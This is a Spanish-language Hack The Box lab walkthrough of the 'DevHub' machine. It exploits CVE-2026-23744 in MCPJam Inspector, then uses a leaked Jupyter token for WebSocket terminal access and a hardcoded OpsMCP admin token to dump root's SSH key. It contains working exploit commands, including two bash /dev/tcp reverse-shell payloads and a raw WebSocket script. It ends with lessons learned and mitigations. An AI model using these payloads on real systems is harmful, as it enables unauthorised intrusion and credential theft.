---
title: "HTB Walkthrough: DevHub"
date: 2026-10-10
draft: false
description: "Walkthrough completo de la máquina DevHub de Hack The Box. Dificultad Media, Linux. CVE-2026-23744 en MCPJam Inspector → token Jupyter expuesto en argumentos de proceso → WebSocket RCE como analyst → admin_token hardcodeado en OpsMCP → dump de clave SSH de root → acceso SSH como root."
tags: ["HackTheBox", "Linux", "Medium", "MCPJam", "CVE-2026-23744", "MCP", "JupyterLab", "WebSocket", "RCE", "OpsMCP", "SSH", "HardcodedCredentials", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough de **DevHub** en Hack The Box. Máquina de dificultad **Media** con **Linux**. El puerto 6274 expone un **MCPJam Inspector 1.4.2** vulnerable a **CVE-2026-23744**: el endpoint `/api/mcp/connect` lanza procesos sin validar el campo `command`, permitiendo RCE sin autenticación. Desde la shell como `mcp-dev`, `ps aux` revela un **Jupyter Lab** en `127.0.0.1:8888` con el **token de autenticación en texto claro** en los argumentos del proceso. Una conexión WebSocket a `/terminals/websocket/1` con ese token da shell como `analyst`. Como `analyst`, el código fuente de un servidor **OpsMCP** corriendo como root expone un `admin_token` hardcodeado; con él se llama al endpoint `ops._admin_dump` que devuelve la **clave SSH privada de root** en claro.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Medium{{< /badge >}}

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                                                                                                                                          |
|----------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Nombre**     | DevHub                                                                                                                                                           |
| **SO**         | Linux (Ubuntu)                                                                                                                                                   |
| **Dificultad** | Media                                                                                                                                                            |
| **IP**         | 10.129.6.113                                                                                                                                                     |
| **Técnicas**   | CVE-2026-23744 MCPJam RCE · Token Jupyter en `/proc` · WebSocket terminal RCE · OpsMCP hardcoded token · SSH key dump vía API                                   |

---

## 1. Reconocimiento

### 1.1 Escaneo de Puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.6.113
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6274/tcp open  unknown
```

### 1.2 Detección de Versiones y Scripts

```bash
nmap -sC -sV -p22,80,6274 10.129.6.113
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
6274/tcp open  http    (MCPJam Inspector)
|_http-title: MCPJam Inspector
```

```bash
echo "10.129.6.113 devhub.htb" >> /etc/hosts
```

> **💡 Superficie de ataque:** tres servicios relevantes — SSH para acceso posterior, nginx en el 80 con virtual host `devhub.htb`, y un **MCPJam Inspector** en el 6274. MCPJam Inspector es una herramienta open-source para inspeccionar y testear servidores MCP (Model Context Protocol), el protocolo que usan los agentes de IA para interactuar con herramientas externas.

---

## 2. Vulnerabilidad Identificada — CVE-2026-23744

Visitando `http://10.129.6.113:6274` se confirma **MCPJam Inspector versión 1.4.2**.

> **⚠️ Versión vulnerable:** MCPJam Inspector **1.4.2** es vulnerable a **CVE-2026-23744**. El endpoint `/api/mcp/connect` acepta un objeto `serverConfig` con un campo `command` que se pasa directamente a `child_process.spawn()` sin ninguna validación ni autenticación. Cualquier cliente puede ejecutar comandos arbitrarios en el sistema operativo del servidor.

---

## 3. Explotación — CVE-2026-23744 (MCPJam Inspector RCE)

El endpoint `/api/mcp/connect` recibe un `serverConfig` que describe cómo lanzar un servidor MCP local. MCPJam usa ese objeto para crear un proceso hijo con `child_process.spawn()` pasando directamente el `command` y `args` que el atacante controla.

```bash
nc -lvnp 4444
```

```bash
curl http://10.129.6.113:6274/api/mcp/connect \
  --header "Content-Type: application/json" \
  --data '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/10.10.14.211/4444 0>&1"],
      "env": {}
    },
    "serverId": "pwn"
  }'
```

```
Normal flow:    serverConfig describe un servidor MCP legítimo → spawn(command, args) arranca el proceso MCP
Flujo malicioso: command=bash + args=[reverse shell] → spawn() ejecuta la shell directamente
                 → conexión saliente → shell como mcp-dev
```

```
Listening on 0.0.0.0 4444
Connection received on 10.129.6.113 40350
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

---

## 4. Escalada Lateral — Token Jupyter en Argumentos de Proceso

### 4.1 Descubrimiento del Token

```bash
ps aux | grep jupyter
```

```
analyst  1038  /home/analyst/jupyter-env/bin/python3
         /home/analyst/jupyter-env/bin/jupyter-lab
         --ip=127.0.0.1
         --port=8888
         --no-browser
         --notebook-dir=/home/analyst/notebooks
         --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
         --ServerApp.password=
         --ServerApp.disable_check_xsrf=False

root     1045  /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

> **💡 Hallazgo clave:** el token de autenticación de Jupyter Lab está visible en texto claro en los argumentos del proceso — legible por cualquier usuario a través de `/proc`. Token: `a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`. Además, un servidor **OpsMCP** corre como **root** — vector para la escalada posterior.

### 4.2 Validación del Token

```bash
curl -s http://127.0.0.1:8888/api \
  -H "Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
```

```json
{"version": "2.17.0"}
```

Token válido — acceso completo a la API de Jupyter Lab como `analyst`.

### 4.3 WebSocket RCE vía Terminal de Jupyter

Jupyter Lab expone terminales interactivas en `/terminals/websocket/<id>`. Conectándonos con el token obtenemos una terminal que ejecuta comandos como `analyst`:

```bash
nc -lvnp 4445
```

```python
python3 - <<'EOF'
import socket, base64, os, time, json

token = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 8888))

key = base64.b64encode(os.urandom(16)).decode()
handshake = (
    "GET /terminals/websocket/1 HTTP/1.1\r\n"
    "Host: 127.0.0.1:8888\r\n"
    "Upgrade: websocket\r\n"
    "Connection: Upgrade\r\n"
    f"Sec-WebSocket-Key: {key}\r\n"
    "Sec-WebSocket-Version: 13\r\n"
    f"Authorization: token {token}\r\n"
    "\r\n"
)
s.send(handshake.encode())
time.sleep(1)
s.recv(4096)

payload  = json.dumps(["stdin", "bash -i >& /dev/tcp/10.10.14.211/4445 0>&1\n"]).encode()
mask_key = os.urandom(4)
masked   = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
frame    = b'\x81' + bytes([0x80 | len(masked)]) + mask_key + masked
s.send(frame)

time.sleep(2)
s.close()
EOF
```

```
Connection received on 10.129.6.113 43744
analyst@devhub:~$
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 5. User Flag

```bash
cat /home/analyst/user.txt
```

> 🔑 User flag obtenida.

---

## 6. Enumeración de Privilegios — OpsMCP Server

```bash
cat /opt/opsmcp/server.py
```

En el código fuente del servidor encontramos tokens hardcodeados:

```python
elif target == "tokens":
    return jsonify({
        "target": "tokens",
        "api_tokens": {
            "admin_token": "opsmcp_admin_7f3b9c2d1e4f5a6b",
            "service_token": "opsmcp_svc_8c9d0e1f2a3b4c5d"
        }
    })
```

> **⚠️ Credenciales en código fuente:** los tokens están hardcodeados en el script Python. El servidor corre como root y está enlazado a `127.0.0.1:5000` — solo acepta conexiones locales, pero como `analyst` tenemos acceso desde la misma máquina.

---

## 7. Escalada de Privilegios — Dump de Clave SSH de Root vía OpsMCP

### 7.1 Extraer la Clave SSH de Root

El servidor OpsMCP expone la herramienta `ops._admin_dump` que, con el `admin_token` y `target=ssh_keys`, devuelve la clave SSH privada de root. El proceso corre como root, por lo que tiene acceso a `/root/.ssh/`:

```bash
curl -H "X-API-Key: opsmcp_admin_7f3b9c2d1e4f5a6b" \
  -X POST http://127.0.0.1:5000/tools/call \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

```json
{
  "note": "Emergency recovery key dump",
  "target": "ssh_keys",
  "root_private_key": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAA...\n-----END OPENSSH PRIVATE KEY-----\n"
}
```

```
Flujo normal:    API OpsMCP expone herramientas de gestión → autenticación por token + origen IP
Flujo malicioso: admin_token hardcodeado en código → ops._admin_dump devuelve clave privada RSA de root
                 → ssh -i root_key root@localhost → shell como root
```

> **⚠️ Exposición crítica:** una API que devuelve claves SSH privadas en texto claro en el cuerpo de una respuesta JSON es equivalente a publicar la clave en un fichero legible por el mundo. El filtrado por IP de origen no es autenticación.

### 7.2 Usar la Clave Extraída para Conectarse como Root

```bash
cat > /tmp/root_key << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
[clave extraída de la respuesta JSON]
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 /tmp/root_key
ssh -i /tmp/root_key -o StrictHostKeyChecking=no root@localhost
```

```
root@devhub:~#
```

---

## 8. Root Flag

```bash
cat /root/root.txt
```

> 🏁 Root flag obtenida.

---

## 9. Resumen y Lecciones Aprendidas

**Cadena de compromiso:**

1. **Reconocimiento** → Nmap revela puertos 22, 80 y 6274. El puerto 6274 sirve MCPJam Inspector 1.4.2.
2. **CVE-2026-23744** → `/api/mcp/connect` sin validación → `command=bash` + reverse shell en `args` → shell como `mcp-dev`.
3. **Token Jupyter** → `ps aux` expone el token de Jupyter Lab en los argumentos del proceso → `a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`.
4. **WebSocket terminal** → conexión a `/terminals/websocket/1` con el token → `["stdin", "bash -i >& /dev/tcp/..."]` → shell como `analyst`.
5. **User flag** → `/home/analyst/user.txt`.
6. **OpsMCP** → `/opt/opsmcp/server.py` (root) contiene `admin_token` hardcodeado → `POST /tools/call` con `ops._admin_dump` + `target=ssh_keys`.
7. **Root** → clave SSH privada de root en la respuesta JSON → `ssh -i root_key root@localhost`.

**Qué aprendí de esta máquina:**

- **CVE-2026-23744 ilustra el riesgo inherente de las herramientas de depuración de agentes IA expuestas en red.** MCPJam Inspector está diseñado para testear servidores MCP — su funcionalidad legítima requiere lanzar procesos. Sin autenticación, esa funcionalidad es directamente RCE. Ninguna herramienta de debug debe exponerse en red sin autenticación, especialmente si su función principal involucra ejecución de procesos.

- **Los argumentos de proceso son legibles por todos los usuarios locales.** En Linux, `/proc/<pid>/cmdline` es legible por cualquier usuario del sistema. Pasar secretos como tokens o contraseñas como argumentos de línea de comandos los expone a todos los usuarios locales. Los secretos deben pasarse siempre por variables de entorno o ficheros de configuración con permisos restrictivos.

- **El WebSocket terminal de Jupyter Lab es acceso shell completo.** El endpoint `/terminals/websocket/1` con un token válido es funcionalmente equivalente a una shell SSH. Un token de Jupyter comprometido es un compromiso total de la cuenta del usuario que lo ejecuta.

- **Los tokens hardcodeados en código fuente son credenciales expuestas.** El archivo `server.py` era legible por `analyst`. Cualquier secreto que aparezca en código fuente debe considerarse comprometido desde el momento en que más de una persona tiene acceso de lectura al repositorio o al sistema de ficheros. Los secretos pertenecen a gestores de secretos o variables de entorno, nunca al código.

- **Un endpoint de API que devuelve claves SSH privadas no tiene justificación de diseño seguro.** Ningún servicio debería exponer material criptográfico privado a través de una API, independientemente de qué autenticación use. La clave SSH de root debería ser inaccesible desde cualquier proceso que no sea el propio sistema operativo.

**Mitigaciones:**

| Vector | Mitigación |
|--------|------------|
| CVE-2026-23744 — MCPJam RCE pre-auth | Actualizar MCPJam; nunca exponer herramientas de debug/inspección en red sin autenticación fuerte |
| Token Jupyter expuesto en argumentos de proceso | Pasar el token mediante fichero de configuración con permisos `600`; nunca como argumento CLI |
| Admin token hardcodeado en `server.py` | Usar variables de entorno o un gestor de secretos; nunca incluir credenciales en código fuente |
| OpsMCP con filtrado de IP como único control de acceso | Implementar autenticación real además del filtrado por IP; el filtrado por IP no es autenticación |
| Endpoint que devuelve clave SSH privada de root en JSON | Nunca exponer claves privadas a través de APIs; usar certificados con CA en lugar de claves estáticas; eliminar cualquier funcionalidad de "emergency key dump" |
